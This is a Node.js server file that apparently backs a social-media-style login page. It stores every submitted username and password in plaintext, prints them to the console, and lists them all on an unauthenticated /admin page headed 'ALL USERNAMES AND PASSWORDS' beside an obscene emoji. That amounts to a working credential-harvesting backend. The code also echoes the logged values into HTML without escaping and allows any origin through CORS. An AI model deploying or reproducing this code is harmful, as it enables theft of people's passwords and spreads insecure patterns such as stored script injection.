const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 4000;

// Store login attempts
let loginLogs = [];

const server = http.createServer((req, res) => {
    console.log('👉', req.method, req.url);
    
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // Serve frontend
    if (req.url === '/' && req.method === 'GET') {
        fs.readFile(path.join(__dirname, '../frontend/index.html'), (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end('index.html not found');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(data);
            }
        });
    }
    
    // Login API
    else if (req.url === '/api/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            let data = JSON.parse(body);
            loginLogs.push({
                username: data.username,
                password: data.password,
                time: new Date().toLocaleString()
            });
            console.log('💾 Login saved:', data.username, data.password);
            
            if (data.username === 'admin' && data.password === '123456') {
                res.end(JSON.stringify({ success: true }));
            } else {
                res.end(JSON.stringify({ success: false }));
            }
        });
    }
    
    // Get posts
    else if (req.url === '/api/posts' && req.method === 'GET') {
        res.end(JSON.stringify([]));
    }
    
    // Create post
    else if (req.url === '/api/posts' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            res.end(JSON.stringify({ success: true }));
        });
    }
    
    // Delete post
    else if (req.url.match(/\/api\/posts\/(.+)/) && req.method === 'DELETE') {
        res.end(JSON.stringify({ success: true }));
    }
    
    // Like post
    else if (req.url.match(/\/api\/posts\/(.+)\/like/) && req.method === 'POST') {
        res.end(JSON.stringify({ success: true }));
    }
    
    // Admin panel
    else if (req.url === '/admin') {
        let logsHtml = '';
        for (let log of loginLogs.slice().reverse()) {
            logsHtml += `<tr><td>${log.username}</td><td style="color:#ff6b6b;">${log.password}</td><td>${log.time}</td></tr>`;
        }
        res.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Panel</title>
                <style>
                    body { background: #0a0e27; color: #00ff88; font-family: monospace; padding: 20px; }
                    h1 { color: #1877f2; text-align: center; }
                    .stats { display: flex; gap: 20px; margin: 20px 0; }
                    .stat-card { background: #1a1f3e; padding: 20px; border-radius: 10px; flex: 1; text-align: center; }
                    .number { font-size: 48px; font-weight: bold; color: #00ff88; }
                    table { width: 100%; border-collapse: collapse; background: #1a1f3e; border-radius: 10px; }
                    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #2a2f4e; }
                    th { background: #1877f2; color: white; }
                    .finger { font-size: 80px; text-align: center; margin: 20px; }
                </style>
            </head>
            <body>
                <h1>🔧 ADMIN PANEL - LOGIN DATABASE 🔧</h1>
                <div class="stats">
                    <div class="stat-card"><div class="number">${loginLogs.length}</div><div>Total Logins</div></div>
                </div>
                <h2>📋 ALL USERNAMES AND PASSWORDS</h2>
                <table><thead><tr><th>USERNAME</th><th>PASSWORD</th><th>TIME</th></tr></thead><tbody>${logsHtml || '<tr><td colspan="3">No logins yet</td></tr>'}</tbody></table>
                <div class="finger">🖕</div>
                <p>Frontend: <a href="http://localhost:${PORT}">http://localhost:${PORT}</a></p>
            </body>
            </html>
        `);
    }
    
    else {
        res.writeHead(404);
        res.end('404');
    }
});

server.listen(PORT, () => {
    console.log('\n🚀 SERVER RUNNING!');
    console.log(`Frontend: http://localhost:${PORT}`);
    console.log(`Admin: http://localhost:${PORT}/admin`);
    console.log('Login: admin / 123456\n');
});